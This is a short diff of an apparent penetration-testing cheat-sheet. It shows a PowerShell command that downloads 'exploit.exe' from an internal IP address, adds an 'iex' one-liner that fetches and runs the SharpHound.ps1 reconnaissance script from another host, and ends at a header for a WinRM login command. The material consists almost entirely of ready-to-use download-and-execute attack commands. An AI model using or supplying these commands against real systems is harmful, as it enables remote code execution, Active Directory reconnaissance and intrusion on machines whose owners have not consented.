@@ -1,7 +1,7 @@
 File transfer with powershell:
 
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')
-
+iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")
 ***************************************************************************************************************************
 
 Command to login with WinRM service:
